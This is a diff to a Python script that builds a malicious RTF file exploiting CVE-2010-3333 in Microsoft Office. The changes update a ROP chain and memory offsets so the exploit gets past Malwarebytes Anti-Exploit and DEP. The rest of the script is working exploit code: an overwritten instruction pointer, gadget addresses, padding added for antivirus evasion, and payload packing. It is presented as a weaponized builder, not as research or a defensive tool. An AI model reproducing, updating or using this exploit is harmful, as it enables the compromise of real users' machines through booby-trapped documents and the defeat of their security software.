@@ -3,11 +3,10 @@ import sys
 filename = "finalOutput.DOC"
 import struct
 
-
 # CVE-2010-3333, builder picked from some random forum.
 # modified to work on windows xp-8, office 2007 (enforced DEP)
-# rop chain first bypasses MBAE's magic check then changes stack to RWX
-# working as of December 9 2014
+# rop chain first moves NULL into 2 offsets of mbae internal structs, then changes stack to RWX using mona.py
+# working as of April 6, 2015
 
 file="{\\rtF#\ansi\aNsIcpg1252\dEFf0\defLANG1033{\fONttbl{\f1\fswiss\FPRQ2\fcHArsET0 Berlin Sans FB Demi;}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}{\f2\fnil\fcharset2 Symbol;}{\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a}}{/*/*/*}"
 file+="\x0d\x0a"*2400000 #inc for UD -_-
@@ -17,11 +16,7 @@ file+="\cf1\ul\b\i\f1\fs40{\pntext\f2\'B7\tab}...........................$iasdka
 
 file+=b'd9808878'     #EIP
 file+="9149414941444347FFFFFFFFFFFAFFFFBFFFFFFF"
-
-
-magic_offset = 0x46c08
-
-
+magic_offset = 0x4cc90
 rop_gadgets = [
 
 0x78833e3c,  # POP EAX # RETN 
@@ -31,7 +26,7 @@ rop_gadgets = [
 0x7882ab5d,  # PUSH ESP # POP ESI # RETN
 0x788e4a48,  # XCHG EAX,ESI # RETN
 0x788079f0,  # POP EBP # RETN
-0x0000008c,  # offset from esp pointing towards mbae.dll
+0x00000098,  # offset from esp pointing towards mbae.dll
 0x788d0ba7,  # ADD EAX,EBP # RETN # eax points to mbae.dll
 0x7889363e,  # POP ECX # RETN
 0x7889363f,  # RETN 
@@ -48,6 +43,11 @@ magic_offset,
 0x00000000,  # NULL
 0x78907a82,  # MOV [EAX],EDX # RETN
 
+#For new MBAE APRIL 6th 2015
+0x7887b821,  # ADD EAX,4 # RETN
+0x78830e9a,  # MOV EAX,[EAX] # RETN
+0x78907a82,  # MOV [EAX],EDX # RETN
+#Finished
 
 
 0x78833e3c,  # POP EAX # RETN
@@ -68,9 +68,6 @@ magic_offset,
 0x90909090,  # nop
 0x788172ee,  # PUSHAD # RETN
 ]
-
-
-
 rop=''.join(struct.pack('<I', _) for _ in rop_gadgets)
 rop= binascii.hexlify(rop)
 payload=rop
